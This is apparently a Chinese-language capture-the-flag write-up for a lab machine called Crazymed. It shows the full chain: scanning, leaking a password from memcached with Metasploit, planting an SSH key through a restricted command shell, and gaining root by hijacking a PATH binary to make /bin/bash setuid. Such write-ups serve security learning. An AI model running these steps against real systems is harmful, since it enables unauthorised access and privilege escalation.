# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 00:55 EDT
Nmap scan report for 192.168.21.1
Host is up (0.0023s latency).
MAC Address: CC:E0:DA:EB:34:A2 (Baidu Online Network Technology (Beijing))
Nmap scan report for 192.168.21.4
Host is up (0.00015s latency).
MAC Address: 04:6C:59:BD:33:50 (Intel Corporate)
Nmap scan report for 192.168.21.5
Host is up (0.076s latency).
MAC Address: 72:10:25:EC:4F:8C (Unknown)
Nmap scan report for 192.168.21.6
Host is up (0.067s latency).
MAC Address: C2:AB:39:9E:98:94 (Unknown)
Nmap scan report for 192.168.21.7
Host is up (0.00028s latency).
MAC Address: 08:00:27:79:B1:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.10
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 2.90 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.7 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 00:56 EDT
Nmap scan report for 192.168.21.7
Host is up (0.00011s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
4444/tcp  open  krb524
11211/tcp open  memcache
MAC Address: 08:00:27:79:B1:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.83 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sU --min-rate 10000 -p- 192.168.21.7
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 00:56 EDT
Warning: 192.168.21.7 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.21.7
Host is up (0.00099s latency).
All 65535 scanned ports on 192.168.21.7 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 08:00:27:79:B1:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 73.10 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sT -sV -O -p22,80,4444,11211 192.168.21.7 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 00:58 EDT
Nmap scan report for 192.168.21.7
Host is up (0.00029s latency).

PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp    open  http      Apache httpd 2.4.54 ((Debian))
4444/tcp  open  krb524?
11211/tcp open  memcached Memcached 1.6.9 (uptime 236 seconds)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4444-TCP:V=7.95%I=7%D=6/10%Time=6847BB80%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2C3,"\x1b\[H\x1b\[2J\x1b\[3J\x1b\[1;97mW\x1b\[0m\x1b\[1;97me\x1b\[0m
SF:\x1b\[1;97ml\x1b\[0m\x1b\[1;97mc\x1b\[0m\x1b\[1;97mo\x1b\[0m\x1b\[1;97m
SF:m\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mt\x1b\[0
SF:m\x1b\[1;97mo\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mt\x1b\[0m\x1b\[1
SF:;97mh\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mC\x1
SF:b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97ma\x1b\[0m\x1b\[1;97mz\x1b\[0m\x1b\[
SF:1;97my\x1b\[0m\x1b\[1;97mm\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;97md\x1b\
SF:[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mm\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\
SF:[1;97md\x1b\[0m\x1b\[1;97mi\x1b\[0m\x1b\[1;97mc\x1b\[0m\x1b\[1;97ma\x1b
SF:\[0m\x1b\[1;97ml\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mr\x1b\[0m\x1b
SF:\[1;97me\x1b\[0m\x1b\[1;97ms\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;97ma\x1
SF:b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97mc\x1b\[0m\x1b\[1;97mh\x1b\[0m\x1b\[
SF:1;97m\x20\x1b\[0m\x1b\[1;97ml\x1b\[0m\x1b\[1;97ma\x1b\[0m\x1b\[1;97mb\x
SF:1b\[0m\x1b\[1;97mo\x1b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97ma\x1b\[0m\x1b\
SF:[1;97mt\x1b\[0m\x1b\[1;97mo\x1b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97my\x1b
SF:\[0m\x1b\[1;97m\.\x1b\[0m\nAll\x20our\x20tests\x20are\x20performed\x20o
SF:n\x20human\x20volunteers\x20for\x20a\x20fee\.\n\n\nPassword:\x20")%r(Ge
SF:tRequest,30D,"\x1b\[H\x1b\[2J\x1b\[3J\x1b\[1;97mW\x1b\[0m\x1b\[1;97me\x
SF:1b\[0m\x1b\[1;97ml\x1b\[0m\x1b\[1;97mc\x1b\[0m\x1b\[1;97mo\x1b\[0m\x1b\
SF:[1;97mm\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mt\
SF:x1b\[0m\x1b\[1;97mo\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mt\x1b\[0m\
SF:x1b\[1;97mh\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;9
SF:7mC\x1b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97ma\x1b\[0m\x1b\[1;97mz\x1b\[0m
SF:\x1b\[1;97my\x1b\[0m\x1b\[1;97mm\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;97m
SF:d\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mm\x1b\[0m\x1b\[1;97me\x1b\[0
SF:m\x1b\[1;97md\x1b\[0m\x1b\[1;97mi\x1b\[0m\x1b\[1;97mc\x1b\[0m\x1b\[1;97
SF:ma\x1b\[0m\x1b\[1;97ml\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mr\x1b\[
SF:0m\x1b\[1;97me\x1b\[0m\x1b\[1;97ms\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;9
SF:7ma\x1b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97mc\x1b\[0m\x1b\[1;97mh\x1b\[0m
SF:\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97ml\x1b\[0m\x1b\[1;97ma\x1b\[0m\x1b\[1;
SF:97mb\x1b\[0m\x1b\[1;97mo\x1b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97ma\x1b\[0
SF:m\x1b\[1;97mt\x1b\[0m\x1b\[1;97mo\x1b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97
SF:my\x1b\[0m\x1b\[1;97m\.\x1b\[0m\nAll\x20our\x20tests\x20are\x20performe
SF:d\x20on\x20human\x20volunteers\x20for\x20a\x20fee\.\n\n\nPassword:\x20\
SF:x1b\[1;31mAccess\x20denied\.\x1b\[0m\n\nPassword:\x20\x1b\[1;31mAccess\
SF:x20denied\.\x1b\[0m\n\nPassword:\x20");
MAC Address: 08:00:27:79:B1:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 164.63 seconds
```

# 漏洞利用

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.7/ -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.7/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              git,html,php,txt,jpg,png,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 51721]
/assets               (Status: 301) [Size: 313] [--> http://192.168.21.7/assets/]                                               
/forms                (Status: 301) [Size: 312] [--> http://192.168.21.7/forms/]                                                
/manual               (Status: 301) [Size: 313] [--> http://192.168.21.7/manual/]                                               
/changelog.txt        (Status: 200) [Size: 2776]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 277]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

没看到有什么

看看能不能找到漏洞

```
msf6 > search memcached

Matching Modules
================

   #  Name                                               Disclosure Date  Rank    Check  Description
   -  ----                                               ---------------  ----    -----  -----------
   0  auxiliary/gather/memcached_extractor               .                normal  No     Memcached Extractor
   1  auxiliary/dos/misc/memcached                       .                normal  No     Memcached Remote Denial of Service
   2  auxiliary/scanner/memcached/memcached_amp          2018-02-27       normal  No     Memcached Stats Amplification Scanner
   3  auxiliary/scanner/memcached/memcached_udp_version  2003-07-23       normal  No     Memcached UDP Version Scanner


Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/memcached/memcached_udp_version
```

尝试利用

```
msf6 auxiliary(gather/memcached_extractor) > run
[+] 192.168.21.7:11211    - Found 4 keys

Keys/Values Found for 192.168.21.7:11211
========================================

 Key            Value
 ---            -----
 conf_location  "VALUE conf_location 0 21\r\n/etc/memecacched.
                conf\r\nEND\r\n"
 domain         "VALUE domain 0 8\r\ncrazymed\r\nEND\r\n"
 log            "VALUE log 0 18\r\npassword: cr4zyM3d\r\nEND\r
                \n"
 server         "VALUE server 0 9\r\n127.0.0.1\r\nEND\r\n"

[+] 192.168.21.7:11211    - memcached loot stored at /home/kali/.msf4/loot/20250610013524_default_192.168.21.7_memcached.dump_775759.txt
[*] 192.168.21.7:11211    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

/home/kali/.msf4/loot/20250610013524_default_192.168.21.7_memcached.dump_775759.txt

```
┌──(kali㉿kali)-[~]
└─$ cat /home/kali/.msf4/loot/20250610013524_default_192.168.21.7_memcached.dump_775759.txt
{"conf_location"=>"VALUE conf_location 0 21\r\n/etc/memecacched.conf\r\nEND\r\n", "log"=>"VALUE log 0 18\r\npassword: cr4zyM3d\r\nEND\r\n", "server"=>"VALUE server 0 9\r\n127.0.0.1\r\nEND\r\n", "domain"=>"VALUE domain 0 8\r\ncrazymed\r\nEND\r\n"}
```

找到了密码：cr4zyM3d。看一下4444端口

```
Welcome to the Crazymed medical research laboratory.
All our tests are performed on human volunteers for a fee.


Password: cr4zyM3d
Access granted.

Type "?" for help.

System command: ?
Authorized commands: id who echo clear 

System command: help
System command: id
uid=1000(brad) gid=1000(brad) groups=1000(brad),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
System command: echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIyH4b8Zoyqq3/IPn4Qg65OisygTuQuahWV9qPm5YovJ kali@kali" > /home/brad/.ssh/authorized_keys
```

ssh连接

```
┌──(kali㉿kali)-[~]
└─$ ssh brad@192.168.21.7 -i .ssh/id_ed25519 
Linux crazymed 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Oct 31 18:36:58 2022 from 192.168.0.29
brad@crazymed:~$
```

# 权限提升

看一下都有什么

```
brad@crazymed:~$ ls -la
total 36
drwxr-xr-x 4 brad brad 4096 Jun 10 07:51 .
drwxr-xr-x 3 root root 4096 Oct 31  2022 ..
lrwxrwxrwx 1 root root    9 Jun 10 07:51 .bash_history -> /dev/null                                                             
-rw-r--r-- 1 brad brad  220 Oct 26  2022 .bash_logout
-rw-r--r-- 1 brad brad 3526 Oct 31  2022 .bashrc
drwxr-xr-x 3 brad brad 4096 Nov  1  2022 .local
-rw-r--r-- 1 brad brad  807 Oct 26  2022 .profile
drwx------ 2 brad brad 4096 Oct 29  2022 .ssh
-rwx------ 1 brad brad   33 Oct 31  2022 user.txt
-rw-r--r-- 1 brad brad  165 Oct 31  2022 .wget-hsts
brad@crazymed:~$ sudo -l
-bash: sudo: command not found
brad@crazymed:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
brad@crazymed:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
brad@crazymed:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
brad:x:1000:1000:brad,,,:/home/brad:/bin/bash
brad@crazymed:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

user

```
brad@crazymed:~$ cat user.txt 
f70a9801673220fb56f42cf9d5ddc28b
```

上传linpeas和pspy64看一下有什么

![image](https://github.com/user-attachments/assets/3a1e8289-0845-4ca8-8248-7b96189ab400)

```
brad@crazymed:~$ cat /opt/check_VM
#! /bin/bash

#users flags
flags=(/root/root.txt /home/brad/user.txt)
for x in "${flags[@]}"
do
if [[ ! -f $x ]] ; then
echo "$x doesn't exist"
mcookie > $x
chmod 700 $x
fi
done

chown -R www-data:www-data /var/www/html

#bash_history => /dev/null
home=$(cat /etc/passwd |grep bash |awk -F: '{print $6}')

for x in $home
do
ln -sf /dev/null $x/.bash_history ; eccho "All's fine !"
done


find /var/log -name "*.log*" -exec rm -f {} +
```

提权

```
brad@crazymed:~$ echo "chmod u+s /bin/bash" > /usr/local/bin/chown
brad@crazymed:~$ chmod +x /usr/local/bin/chown
brad@crazymed:~$ /bin/bash -p
bash-5.1# id
uid=1000(brad) gid=1000(brad) euid=0(root) groups=1000(brad),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
```

root

```
bash-5.1# cat root.txt 
b9b38d9533ca00072eff46338bf21b43
```
